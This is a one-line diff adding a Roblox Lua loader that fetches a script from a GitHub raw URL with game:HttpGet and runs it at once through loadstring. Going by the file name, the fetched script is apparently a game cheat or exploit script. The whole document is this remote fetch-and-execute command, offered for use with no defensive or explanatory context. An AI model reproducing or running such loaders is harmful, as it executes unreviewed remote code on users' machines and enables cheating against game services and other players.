@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/5-hours-crazy-skeleton-rng-spam2-ojl2n6d9mb9rrg.lua"))()
